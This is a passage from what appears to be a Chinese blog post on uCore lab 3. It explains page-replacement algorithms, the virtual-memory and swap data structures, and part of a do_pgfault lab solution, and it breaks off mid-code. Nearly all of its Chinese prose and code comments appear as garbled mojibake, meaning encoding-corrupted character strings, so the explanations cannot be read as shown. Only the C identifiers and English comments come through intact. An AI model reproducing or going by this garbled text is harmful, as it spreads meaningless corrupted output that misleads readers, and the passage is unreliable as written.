ä¸€ä½å¼•ç”¨ä½å’Œä¸€ä½ä¿®æ”¹ä½ã€‚å½“è¯¥é¡µè¢«è®¿é—®æ—¶ï¼ŒCPUä¸­çš„MMUç¡¬ä»¶å°†æŠŠè®¿é—®ä½ç½®â€œ1â€ã€‚å½“è¯¥é¡µè¢«â€œå†™â€æ—¶ï¼ŒCPUä¸­çš„MMUç¡¬ä»¶å°†æŠŠä¿®æ”¹ä½ç½®â€œ1â€ã€‚è¿™æ ·è¿™ä¸¤ä½å°±å­˜åœ¨å››ç§å¯èƒ½çš„ç»„åˆæƒ…å†µï¼šï¼ˆ0ï¼Œ0ï¼‰è¡¨ç¤ºæœ€è¿‘æœªè¢«å¼•ç”¨ä¹Ÿæœªè¢«ä¿®æ”¹ï¼Œé¦–å…ˆé€‰æ‹©æ­¤é¡µæ·˜æ±°ï¼›ï¼ˆ0ï¼Œ1ï¼‰æœ€è¿‘æœªè¢«ä½¿ç”¨ï¼Œä½†è¢«ä¿®æ”¹ï¼Œå…¶æ¬¡é€‰æ‹©ï¼›ï¼ˆ1ï¼Œ0ï¼‰æœ€è¿‘ä½¿ç”¨è€Œæœªä¿®æ”¹ï¼Œå†æ¬¡é€‰æ‹©ï¼›ï¼ˆ1ï¼Œ1ï¼‰æœ€è¿‘ä½¿ç”¨ä¸”ä¿®æ”¹ï¼Œæœ€åé€‰æ‹©ã€‚è¯¥ç®—æ³•ä¸æ—¶é’Ÿç®—æ³•ç›¸æ¯”ï¼Œå¯è¿›ä¸€æ­¥å‡å°‘ç£ç›˜çš„I/Oæ“ä½œæ¬¡æ•°ï¼Œä½†ä¸ºäº†æŸ¥æ‰¾åˆ°ä¸€ä¸ªå°½å¯èƒ½é€‚åˆæ·˜æ±°çš„é¡µé¢ï¼Œ</strong>å¯èƒ½éœ€è¦ç»è¿‡å¤šæ¬¡æ‰«æï¼Œå¢åŠ äº†ç®—æ³•æœ¬èº«çš„æ‰§è¡Œå¼€é”€</strong>ã€‚</li></ul><h3 id="3-ç›¸å…³æ•°æ®ç»“æ„"><a href="#3-ç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="3.ç›¸å…³æ•°æ®ç»“æ„"></a>3.ç›¸å…³æ•°æ®ç»“æ„</h3><blockquote><p>Typoarç»™æˆ‘æ•´äº†ä¸ªå´©æºƒ, æˆ‘ä¹Ÿå´©æºƒäº†âŠ™â–ƒâŠ™ä»¥ä¸‹å†…å®¹ç›´è‡³challengeå‰å¤åˆ¶äº<a href="https://kiprey.github.io/2020/08/uCore-3/#3-uCore%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%9C%BA%E5%88%B6%E7%9A%84%E5%AE%9E%E7%8E%B0">è¿™é‡Œ</a> </p></blockquote><h4 id="I-è™šæ‹Ÿå†…å­˜ç®¡ç†"><a href="#I-è™šæ‹Ÿå†…å­˜ç®¡ç†" class="headerlink" title="I. è™šæ‹Ÿå†…å­˜ç®¡ç†"></a>I. è™šæ‹Ÿå†…å­˜ç®¡ç†</h4><ul><li><p>ç»“æ„ä½“å˜é‡<code>check_mm_struct</code>ç”¨äºç®¡ç†è™šæ‹Ÿå†…å­˜é¡µé¢ï¼Œå…¶ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// the control struct for a set of vma using the same PDT</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br>    <span class="hljs-keyword">list_entry_t</span> mmap_list;        <span class="hljs-comment">// æŒ‰ç…§è™šæ‹Ÿåœ°å€é¡ºåºåŒå‘è¿æ¥çš„è™šæ‹Ÿé¡µé“¾è¡¨</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">mmap_cache</span>;</span> <span class="hljs-comment">// å½“å‰ä½¿ç”¨çš„è™šæ‹Ÿé¡µåœ°å€ï¼Œè¯¥æˆå‘˜åŠ é€Ÿé¡µç´¢å¼•é€Ÿåº¦ã€‚</span><br>    <span class="hljs-keyword">pde_t</span> *pgdir;                  <span class="hljs-comment">// è™šæ‹Ÿé¡µå¯¹åº”çš„PDT</span><br>    <span class="hljs-keyword">int</span> map_count;                 <span class="hljs-comment">// è™šæ‹Ÿé¡µä¸ªæ•°</span><br>    <span class="hljs-keyword">void</span> *sm_priv;                 <span class="hljs-comment">// ç”¨äºæŒ‡å‘swap managerçš„æŸä¸ªé“¾è¡¨,åœ¨FIFOç®—æ³•ä¸­ï¼Œè¯¥åŒå‘é“¾è¡¨ç”¨äºå°†å¯äº¤æ¢çš„å·²åˆ†é…ç‰©ç†é¡µä¸²èµ·æ¥</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>å½“åˆ†é…å‡ºæ–°çš„è™šæ‹Ÿé¡µæ—¶ï¼Œç¨‹åºä¼šæ‰§è¡Œ<code>insert_vma_struct</code>å‡½æ•°ï¼Œæ­¤æ—¶è™šæ‹Ÿé¡µ<code>vma_struct</code>å°±ä¼šè¢«æ’å…¥<code>mm_struct::mmap_list</code>åŒå‘é“¾è¡¨ä¸­ã€‚</p></li><li><p>è‹¥ç¨‹åºé¦–æ¬¡è®¿é—®è¯¥å†…å­˜è€Œè§¦å‘ç¼ºé¡µä¸­æ–­æ—¶ï¼Œç¨‹åºä¼šåœ¨ç¼ºé¡µå¤„ç†ç¨‹åºä¸­ä¸ºè¯¥è™šæ‹Ÿé¡µåˆ’åˆ†å‡ºä¸€å—æ–°çš„ç‰©ç†é¡µã€‚åŒæ—¶ï¼Œè¿˜ä¼šæ›´æ–°<code>mm_struct::pgdir</code>ä¸Šçš„å¯¹åº”é¡µè¡¨æ¡ç›®ï¼Œä¹‹åè¯¥é¡µçš„å†…å­˜è®¿é—®å³å¯æ­£å¸¸æ‰§è¡Œã€‚</p></li><li><p>åœ¨FIFOé¡µé¢ç½®æ¢ç®—æ³•ä¸­ï¼Œåˆå§‹æ—¶ï¼Œ<code>mm_struct</code>ä¸­çš„<code>sm_priv</code>ä¼šè¢«è®¾ç½®ä¸º<code>pra_list_head</code>ã€‚è€Œ<code>pra_list_head</code>æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨çš„èµ·å§‹ç»“ç‚¹ï¼Œè¯¥åŒå‘é“¾è¡¨ç”¨äºå°†<strong>å¯äº¤æ¢çš„å·²åˆ†é…ç‰©ç†é¡µ</strong>ä¸²èµ·æ¥ã€‚</p></li></ul><h4 id="II-é¡µé¢ç½®æ¢"><a href="#II-é¡µé¢ç½®æ¢" class="headerlink" title="II. é¡µé¢ç½®æ¢"></a>II. é¡µé¢ç½®æ¢</h4><ul><li><p><code>swap_manager</code>ä¸<code>pmm_manager</code>ç±»ä¼¼ï¼Œéƒ½è®¾ç½®äº†ä¸€ä¸ªç”¨äºç®¡ç†æŸä¸ªåŠŸèƒ½çš„æ¨¡å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">swap_manager</span></span><br><span class="hljs-class">&#123;</span><br>     <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>     <span class="hljs-comment">/* Global initialization for the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*init)            (<span class="hljs-keyword">void</span>);<br>     <span class="hljs-comment">/* Initialize the priv data inside mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*init_mm)         (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when tick interrupt occured */</span><br>     <span class="hljs-keyword">int</span> (*tick_event)      (struct mm_struct *mm);<br>     <span class="hljs-comment">/* Called when map a swappable page into the mm_struct */</span><br>     <span class="hljs-keyword">int</span> (*map_swappable)   (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page *page, <span class="hljs-keyword">int</span> swap_in);<br>     <span class="hljs-comment">/* When a page is marked as shared, this routine is called to</span><br><span class="hljs-comment">      * delete the addr entry from the swap manager */</span><br>     <span class="hljs-keyword">int</span> (*set_unswappable) (struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr);<br>     <span class="hljs-comment">/* Try to swap out a page, return then victim */</span><br>     <span class="hljs-keyword">int</span> (*swap_out_victim) (struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick);<br>     <span class="hljs-comment">/* check the page relpacement algorithm */</span><br>     <span class="hljs-keyword">int</span> (*check_swap)(<span class="hljs-keyword">void</span>);<br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>è‹¥ä½¿ç”¨FIFOé¡µé¢ç½®æ¢ç®—æ³•ï¼Œåˆ™åœ¨ç¼ºé¡µä¸­æ–­ç¨‹åºä¸­ï¼Œç¨‹åºåªä¼š<strong>æ¢å…¥</strong>ç›®æ ‡ç‰©ç†é¡µï¼Œè€Œä¸ä¼šä¸»åŠ¨æ¢å‡ºã€‚</p><p>åªæœ‰åœ¨åˆ†é…ç©ºé—²ç‰©ç†é¡µæ—¶ï¼Œè‹¥<code>pmm_manager-&gt;alloc_pages(n)</code>å¤±è´¥ï¼Œåˆ™ç¨‹åºæ‰ä¼šæ‰§è¡Œä¸€æ¬¡é¡µé¢æ¢å‡ºï¼Œä»¥è…¾å‡ºç©ºé—²çš„ç‰©ç†é¡µï¼Œå¹¶é‡æ–°åˆ†é…ã€‚</p></li><li><p><code>swap_in</code>å‡½æ•°åªä¼šå°†ç›®æ ‡ç‰©ç†é¡µåŠ è½½è¿›å†…å­˜ä¸­ï¼Œè€Œä¸ä¼šä¿®æ”¹é¡µè¡¨æ¡ç›®ã€‚æ‰€ä»¥ç›¸å…³çš„æ ‡å¿—ä½è®¾ç½®å¿…é¡»åœ¨<code>swap_in</code>å‡½æ•°çš„å¤–éƒ¨æ‰‹åŠ¨å¤„ç†ã€‚è€Œ<code>swap_out</code>å‡½æ•°ä¼šå…ˆæ‰§è¡Œ<code>swap_out_victim</code>ï¼Œæ‰¾å‡ºæœ€é€‚åˆæ¢å‡ºçš„ç‰©ç†é¡µï¼Œå¹¶å°†å…¶æ¢å‡ºï¼Œæœ€ååˆ·æ–°TLB, <strong>æœ‰å¯èƒ½æ¢å‡ºå¤šé¡µ</strong>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯<code>swap_out</code>å‡½æ•°ä¼šåœ¨å‡½æ•°å†…éƒ¨è®¾ç½®PTEï¼Œå½“æŸä¸ªé¡µé¢è¢«æ¢å‡ºåï¼ŒPTEä¼šè¢«è®¾ç½®ä¸ºæ‰€æ¢å‡ºç‰©ç†é¡µåœ¨ç¡¬ç›˜ä¸Šçš„åç§», è€Œä¸”ä¼šæ‰§è¡Œ<strong>free_page</strong>, å¾€ç©ºé—²é“¾è¡¨é‡Œé¢åŠ å…¥è¯¥page</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;swap_out: i %d, store page in vaddr 0x%x to disk swap entry %d\n&quot;</span>, i, v, page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>);<br>*ptep = (page-&gt;pra_vaddr/PGSIZE+<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">8</span>;<br>free_page(page);<br></code></pre></div></td></tr></table></figure><p>å½“PTEæ‰€å¯¹åº”çš„ç‰©ç†é¡µå­˜åœ¨äºå†…å­˜ä¸­ï¼Œé‚£ä¹ˆè¯¥PTEå°±æ˜¯æ­£å¸¸çš„é¡µè¡¨æ¡ç›®ï¼Œå¯è¢«CPUç›´æ¥å¯»å€ç”¨äºè½¬æ¢åœ°å€ã€‚ä½†å½“æ‰€å¯¹åº”çš„ç‰©ç†é¡µä¸åœ¨å†…å­˜æ—¶ï¼Œè¯¥PTEå°±æˆä¸º<code>swap_entry_t</code>ï¼Œä¿å­˜è¯¥ç‰©ç†é¡µæ•°æ®åœ¨å¤–å­˜çš„åç§»ä½ç½®ã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * swap_entry_t</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> * |         offset        |   reserved   | 0 |</span><br><span class="hljs-comment"> * --------------------------------------------</span><br><span class="hljs-comment"> *           24 bits            7 bits    1 bit</span><br><span class="hljs-comment"> * /</span><br><span class="hljs-comment"> /* *</span><br><span class="hljs-comment"> * swap_offset - takes a swap_entry (saved in pte), and returns</span><br><span class="hljs-comment"> * the corresponding offset in swap mem_map.</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> swap_offset(entry) (&#123;                                       \</span><br><span class="hljs-meta">               size_t __offset = (entry &gt;&gt; 8);                        \</span><br><span class="hljs-meta">               <span class="hljs-meta-keyword">if</span> (!(__offset &gt; 0 &amp;&amp; __offset &lt; max_swap_offset)) &#123;    \</span><br><span class="hljs-meta">                    panic(<span class="hljs-meta-string">&quot;invalid swap_entry_t = %08x.\n&quot;</span>, entry);    \</span><br><span class="hljs-meta">               &#125;                                                    \</span><br><span class="hljs-meta">               __offset;                                            \</span><br><span class="hljs-meta">          &#125;)</span><br></code></pre></div></td></tr></table></figure></li><li><p>åŒæ—¶ï¼Œä¸æ˜¯æ‰€æœ‰ç‰©ç†é¡µé¢éƒ½å¯ä»¥ç½®æ¢ï¼Œä¾‹å¦‚å†…æ ¸å…³é”®ä»£ç å’Œæ•°æ®ç­‰ç­‰ï¼Œæ‰€ä»¥åœ¨åˆ†é…ç‰©ç†é¡µæ—¶ï¼Œéœ€è¦å¯¹äºé‚£äº›å¯è¢«ç½®æ¢çš„ç‰©ç†é¡µæ‰§è¡Œ<code>swap_map_swappable</code>å‡½æ•°ï¼Œå°†è¯¥ç‰©ç†é¡µåŠ å…¥åˆ°<code>mm_struct::sm_priv</code>æŒ‡é’ˆæ‰€æŒ‡å‘çš„åŒå‘é“¾è¡¨ä¸­ï¼Œæ¢å…¥å’Œæ¢å‡ºæ“ä½œéƒ½ä¼šæ“ä½œè¯¥é“¾è¡¨ï¼ˆæ’å…¥/ç§»é™¤<strong>å¯äº¤æ¢çš„å·²åˆ†é…</strong>ç‰©ç†é¡µï¼‰ã€‚</p></li><li><p>æ•°æ®ç»“æ„<code>Page</code>å’Œ<code>vma_struct</code>åˆ†åˆ«ç”¨äºç®¡ç†ç‰©ç†é¡µå’Œè™šæ‹Ÿé¡µï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// ç”¨äºæè¿°æŸä¸ªè™šæ‹Ÿé¡µçš„ç»“æ„</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span> <span class="hljs-comment">// ç®¡ç†è¯¥è™šæ‹Ÿé¡µçš„mm_struct</span><br>    <span class="hljs-keyword">uintptr_t</span> vm_start;      <span class="hljs-comment">// è™šæ‹Ÿé¡µèµ·å§‹åœ°å€ï¼ŒåŒ…æ‹¬å½“å‰åœ°å€  </span><br>    <span class="hljs-keyword">uintptr_t</span> vm_end;        <span class="hljs-comment">// è™šæ‹Ÿé¡µç»ˆæ­¢åœ°å€ï¼Œä¸åŒ…æ‹¬å½“å‰åœ°å€ï¼ˆåœ°å€å‰é—­åå¼€ï¼‰  </span><br>    <span class="hljs-keyword">uint32_t</span> vm_flags;       <span class="hljs-comment">// ç›¸å…³æ ‡å¿—ä½</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;  <span class="hljs-comment">// ç”¨äºè¿æ¥å„ä¸ªè™šæ‹Ÿé¡µçš„åŒå‘æŒ‡é’ˆ</span><br>&#125;;<br><br><span class="hljs-comment">// æ•°æ®ç»“æ„Pageç›¸å…³æˆå‘˜çš„ç”¨é€”å·²åœ¨uCore-2ä¸­ä»‹ç»è¿‡ï¼Œè¿™é‡Œåªæå®ƒæ–°å¢çš„ä¸¤ä¸ªæˆå‘˜pra_*</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;<br>    <span class="hljs-keyword">uint32_t</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<br>    <span class="hljs-keyword">list_entry_t</span> page_link;<br>    <span class="hljs-keyword">list_entry_t</span> pra_page_link;     <span class="hljs-comment">// ç”¨äºè¿æ¥ä¸Šä¸€ä¸ªå’Œä¸‹ä¸€ä¸ª*å¯äº¤æ¢å·²åˆ†é…*çš„ç‰©ç†é¡µ</span><br>    <span class="hljs-keyword">uintptr_t</span> pra_vaddr;            <span class="hljs-comment">// ç”¨äºä¿å­˜è¯¥ç‰©ç†é¡µæ‰€å¯¹åº”çš„è™šæ‹Ÿåœ°å€ã€‚</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>å½“åˆ†é…æŸä¸ªè™šæ‹Ÿé¡µ<code>vma_struct</code>æ—¶ï¼Œç¨‹åºä¼šåœ¨<code>insert_vma_struct</code>å‡½æ•°ä¸­è®¾ç½®å…¶<code>vm_mm</code>æˆå‘˜ä¸ºæŸä¸ª<code>mm_struct</code>ï¼Œè¿™æ ·ä¾¿äºåç»­çš„ç®¡ç†ã€‚</li><li>åœ¨å‡½æ•°<code>pgdir_alloc_page</code>ä¸­ï¼Œç¨‹åºä¼šè®¾ç½®<code>Page</code>çš„<code>pra_vaddr</code>æˆå‘˜ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰ç‰©ç†é¡µæ‰€å¯¹åº”çš„è™šæ‹Ÿåœ°å€ï¼Œä¹‹åä¾¿å¯é€šè¿‡<code>Page-&gt;pra_vaddr-&gt;pte</code>ä¸€æ¡é“¾ï¼Œç›´æ¥æ‰¾åˆ°å½“å‰<strong>ç‰©ç†é¡µ</strong>åœ°å€æ‰€å¯¹åº”çš„PTEæ¡ç›®ã€‚åŒæ—¶ï¼Œä¹Ÿå¯é€šè¿‡<code>pra_vaddr</code>æ¥ç¡®å®šå¯¹åº”å¤–å­˜çš„ç›¸å¯¹åç§»<code>page-&gt;pra_vaddr/PGSIZE+1</code>ã€‚</li><li><code>Page::page_link</code>ç”¨äºå°†ç©ºé—²ç‰©ç†é¡µè¿æ¥è‡³åŒå‘é“¾è¡¨ä¸­ï¼Œè€Œ<code>page::pra_page_link</code>ç”¨äºå°†<strong>å¯äº¤æ¢çš„å·²åˆ†é…</strong>ç‰©ç†é¡µè¿æ¥è‡³å¦ä¸€ä¸ªåŒå‘é“¾è¡¨ä¸­ï¼Œæ³¨æ„ä¸¤è€…çš„ç”¨é€”æ˜¯ä¸åŒçš„ã€‚</li></ul></li></ul><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 0"><a href="#ç»ƒä¹ 0" class="headerlink" title="ç»ƒä¹ 0"></a>ç»ƒä¹ 0</h3><blockquote><p><strong>å¡«å†™å·²æœ‰å®éªŒ</strong> </p></blockquote><h3 id="ç»ƒä¹ 1"><a href="#ç»ƒä¹ 1" class="headerlink" title="ç»ƒä¹ 1"></a>ç»ƒä¹ 1</h3><blockquote><p><strong>ç»™æœªè¢«æ˜ å°„çš„åœ°å€æ˜ å°„ä¸Šç‰©ç†é¡µ</strong></p><p>å®Œæˆdo_pgfaultï¼ˆmm/vmm.cï¼‰å‡½æ•°ï¼Œç»™æœªè¢«æ˜ å°„çš„åœ°å€æ˜ å°„ä¸Šç‰©ç†é¡µã€‚è®¾ç½®è®¿é—®æƒé™ çš„æ—¶å€™éœ€è¦å‚è€ƒé¡µé¢æ‰€åœ¨ VMA çš„æƒé™ï¼ŒåŒæ—¶éœ€è¦æ³¨æ„æ˜ å°„ç‰©ç†é¡µæ—¶éœ€è¦æ“ä½œå†…å­˜æ§åˆ¶ ç»“æ„æ‰€æŒ‡å®šçš„é¡µè¡¨ï¼Œè€Œä¸æ˜¯å†…æ ¸çš„é¡µè¡¨ã€‚</p></blockquote><p>å®éªŒä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_INVAL;<br>    <span class="hljs-comment">// è·å–è§¦å‘pgfaultçš„è™šæ‹Ÿåœ°å€æ‰€åœ¨è™šæ‹Ÿé¡µ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">vma</span> =</span> find_vma(mm, addr);<br><br>    pgfault_num++;<br>    <span class="hljs-comment">// å¦‚æœå½“å‰è®¿é—®çš„è™šæ‹Ÿåœ°å€ä¸åœ¨å·²ç»åˆ†é…çš„è™šæ‹Ÿé¡µä¸­</span><br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;\<br>        cprintf(<span class="hljs-string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// æ£€æµ‹é”™è¯¯ä»£ç ã€‚è¿™é‡Œçš„æ£€æµ‹ä¸æ¶‰åŠç‰¹æƒåˆ¤æ–­ã€‚</span><br>    <span class="hljs-keyword">switch</span> (error_code &amp; <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// å†™ï¼ŒåŒæ—¶å­˜åœ¨ç‰©ç†é¡µï¼Œåˆ™å†™æ—¶å¤åˆ¶</span><br>        <span class="hljs-comment">// éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdefaultä¼šæ‰§è¡Œcase2çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯åˆ¤æ–­æ˜¯å¦æœ‰å†™æƒé™ã€‚</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-comment">// åŒæ—¶å¦‚æœå½“å‰æ“ä½œæ˜¯å†™å…¥ï¼Œä½†æ‰€åœ¨è™šæ‹Ÿé¡µä¸å…è®¸å†™å…¥</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=1): read, present */</span><br>        <span class="hljs-comment">// è¯»ï¼ŒåŒæ—¶å­˜åœ¨ç‰©ç†é¡µã€‚é‚£å°±ä¸å¯èƒ½ä¼šè°ƒç”¨page faultï¼Œè‚¯å®šå“ªé‡Œæœ‰é—®é¢˜ï¼Œç›´æ¥failed</span><br>        cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=0): read, not present */</span><br>        <span class="hljs-comment">// å¦‚æœå½“å‰æ“ä½œæ˜¯è¯»å–ï¼Œä½†æ‰€åœ¨è™šæ‹Ÿé¡µä¸å…è®¸è¯»å–æˆ–æ‰§è¡Œ</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// è®¾ç½®é¡µè¡¨æ¡ç›®æ‰€å¯¹åº”çš„æƒé™</span><br>    <span class="hljs-keyword">uint32_t</span> perm = PTE_U;<br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;<br>        perm |= PTE_W;<br>    &#125;<br>    addr = ROUNDDOWN(addr, PGSIZE);<br>    ret = -E_NO_MEM;<br>    <span class="hljs-keyword">pte_t</span> *ptep=<span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* LAB3 EXERCISE 1: YOUR CODE */</span><br>    <span class="hljs-comment">// æŸ¥æ‰¾å½“å‰è™šæ‹Ÿåœ°å€æ‰€å¯¹åº”çš„é¡µè¡¨é¡¹</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// å¦‚æœè¿™ä¸ªé¡µè¡¨é¡¹æ‰€å¯¹åº”çš„ç‰©ç†é¡µä¸å­˜åœ¨ï¼Œåˆ™</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// åˆ†é…ä¸€å—ç‰©ç†é¡µï¼Œå¹¶è®¾ç½®é¡µè¡¨é¡¹</span><br>        <span class="hljs-keyword">if</span> 